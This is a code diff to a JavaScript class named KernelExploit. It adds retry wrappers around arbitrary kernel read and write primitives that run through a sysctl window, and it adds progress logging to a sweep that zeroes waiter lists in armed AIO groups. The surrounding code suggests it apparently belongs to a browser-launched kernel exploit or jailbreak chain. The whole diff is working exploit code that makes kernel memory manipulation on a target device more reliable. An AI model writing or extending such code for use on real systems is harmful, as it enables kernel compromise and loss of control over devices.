@@ -21,6 +21,10 @@ const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 // Delays after parking AIO workers and between armed sweep groups.
 const POST_PARK_DELAY_MS = 1000;
 const SWEEP_DELAY_MS = 100;
+// Pause between retries of a dropped sysctl-window access, and how many
+// attempts each defuse access gets before it is accepted as a failure.
+const SWEEP_RETRY_DELAY_MS = 10;
+const SWEEP_RETRY_ATTEMPTS = 3;
 
 async function runKernelExploit(p, chain, log, launchKexp) {
   return new KernelExploit(p, chain, log, launchKexp).run();
@@ -972,33 +976,87 @@ class KernelExploit {
     return ok;
   }
 
+  // The sysctl window drops the occasional read or write: upstream's own
+  // comment on the waiter zeroing is "the slow primitive drops writes
+  // occasionally". A single dropped op inside the defuse leaves an armed
+  // group unverifiable, which the accounting below counts as a skip -- and a
+  // skip fails the whole defuse. Each access re-aims the window anyway, so a
+  // retry recovers a transient flake; forcing the high half to be rewritten
+  // first (a high write that never landed must not survive in the windowHigh
+  // bookkeeping) keeps the re-aim complete. A failure that persists through
+  // every attempt is returned as-is, so the caller still skips and the
+  // verdict stays conservative.
+  async defuseAccess(op) {
+    let out;
+    for (let attempt = 0; attempt < SWEEP_RETRY_ATTEMPTS; attempt++) {
+      if (attempt > 0) {
+        this.windowHigh = 0xffffffff;
+        if (SWEEP_RETRY_DELAY_MS > 0) await sleep(SWEEP_RETRY_DELAY_MS);
+      }
+      out = await op();
+      if (out.ok) return out;
+    }
+    return out;
+  }
+
+  async defuseRead32(address, valid) {
+    return this.defuseAccess(async () => {
+      const r = await this.kread32(address);
+      const ok = r.rv === 0 && (!valid || valid(r.value));
+      return { ok, rv: r.rv, value: r.value };
+    });
+  }
+
+  async defuseRead64(address) {
+    return this.defuseAccess(async () => {
+      const r = await this.kread64(address);
+      return { ok: r.rv === 0, rv: r.rv, value: r.value };
+    });
+  }
+
+  async defuseReadPointer(address) {
+    return this.defuseAccess(async () => {
+      const r = await this.kread64(address);
+      const value = this.isKernelPointer(r.value) ? r.value : null;
+      return { ok: r.rv === 0 && !!value, rv: r.rv, value };
+    });
+  }
+
+  async defuseWrite32(address, value) {
+    return this.defuseAccess(async () => {
+      const rv = await this.kwrite32(address, value);
+      return { ok: rv === 0, rv };
+    });
+  }
+
   async lookupAioGroup(table, id) {
     const { pages, slotStride, entryType } = this.off.aio.idTable;
     const index = id & 0x1fff;
 
-    const pageCount = await this.kread32(table.add32(pages));
+    const pageCount = await this.defuseRead32(table.add32(pages),
+      (v) => v !== 0 && v <= 64);
     if (pageCount.rv !== 0 || pageCount.value === 0 || pageCount.value > 64)
       return null;
     if (index >= pageCount.value << 7)
       return null;
 
-    const page = await this.readKernelPointer(table.add32((index >>> 7) * 8));
+    const page = (await this.defuseReadPointer(table.add32((index >>> 7) * 8))).value;
     if (!page) return null;
 
     const slot = page.add32((id & 0x7f) * slotStride);
-    const generation = await this.kread32(slot.add32(0x28));
+    const generation = await this.defuseRead32(slot.add32(0x28));
     if (generation.rv !== 0) return null;
     if (((((generation.value & 0xffff) << 13) | index) & 0xffff) !== id)
       return null;
 
-    const state = await this.kread32(slot.add32(0x24)); // free_next | state<<16
+    const state = await this.defuseRead32(slot.add32(0x24)); // free_next | state<<16
     if (state.rv !== 0 || state.value >>> 16 !== 3) return null;
 
-    const type = await this.kread32(slot.add32(0x20));
+    const type = await this.defuseRead32(slot.add32(0x20));
     if (type.rv !== 0 || (type.value & 0xffff) !== entryType)
       return null;
 
-    return this.readKernelPointer(slot.add32(0x10));
+    return (await this.defuseReadPointer(slot.add32(0x10))).value;
   }
 
   async defuseAioGroups() {
@@ -1020,7 +1078,8 @@ class KernelExploit {
       skipped = 0,
       failed = 0;
 
-    for (const ids of this.armedGroups) {
+    for (let arming = 0; arming < this.armedGroups.length; arming++) {
+      const ids = this.armedGroups[arming];
       for (const id of ids) {
         if (SWEEP_DELAY_MS > 0) await sleep(SWEEP_DELAY_MS);
         total++;
@@ -1030,35 +1089,43 @@ class KernelExploit {
           continue;
         }
 
-        const shared = await this.readKernelPointer(group.add32(0x10));
+        const shared = (await this.defuseReadPointer(group.add32(0x10))).value;
         if (!shared) {
           skipped++;
           continue;
         }
 
-        const groupNum = await this.kread32(shared.add32(num));
-        const groupState = await this.kread32(shared.add32(state));
+        const groupNum = await this.defuseRead32(shared.add32(num), (v) => v === 1);
+        const groupState = await this.defuseRead32(shared.add32(state),
+          (v) => v >= 1 && v <= 4);
         if (groupNum.value !== 1 || groupState.value < 1 || groupState.value > 4) {
           skipped++;
           continue;
         }
 
-        const head = await this.kread64(shared.add32(waiters));
-        if (head.value.low === 0 && head.value.hi === 0) {
+        const head = await this.defuseRead64(shared.add32(waiters));
+        if (head.rv === 0 && head.value.low === 0 && head.value.hi === 0) {
           alreadyClear++;
           continue;
         }
 
         let ok = false;
         for (let attempt = 0; attempt < 3 && !ok; attempt++) {
-          await this.kwrite32(shared.add32(waiters), 0);
-          await this.kwrite32(shared.add32(waiters + 4), 0);
-          const back = await this.kread64(shared.add32(waiters));
-          ok = back.value.low === 0 && back.value.hi === 0;
+          await this.defuseWrite32(shared.add32(waiters), 0);
+          await this.defuseWrite32(shared.add32(waiters + 4), 0);
+          const back = await this.defuseRead64(shared.add32(waiters));
+          ok = back.rv === 0 && back.value.low === 0 && back.value.hi === 0;
         }
         if (ok) cleared++;
         else failed++;
       }
+      // The sweep is silent for seconds per group (the window is re-aimed for
+      // every access, and a retried access adds its own delay), and a page
+      // that looks frozen invites a mid-run power-cycle -- exactly the
+      // interruption this exploit must never receive. One line per armed
+      // group proves the defuse is moving without spamming the log trim.
+      await this.report("Kernel", "checking aio groups: " + (arming + 1) +
+        "/" + this.armedGroups.length + " groups swept");
     }
 
     const ok = skipped === 0 && failed === 0 && cleared + alreadyClear === total;
